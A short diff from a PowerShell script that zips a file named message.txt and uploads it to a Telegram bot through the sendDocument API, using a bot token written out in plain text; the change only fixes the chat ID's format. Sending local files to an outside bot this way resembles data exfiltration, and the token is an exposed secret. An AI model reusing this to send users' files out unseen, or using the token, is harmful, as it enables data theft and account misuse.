@@ -11,7 +11,7 @@ Compress-Archive -Path "$basePath\message.txt" -DestinationPath $zipPath -Force
 
 # Send to Telegram
 $token = "8392772771:AAFgffIbtVeD4xBpg0rzlGSfPsbW0GG-a0o"
-$chatID = "<7398435102>"
+$chatID = "7398435102"
 $uri = "https://api.telegram.org/bot$token/sendDocument"
 $caption = "Have a nice day from PowerShell!"
 
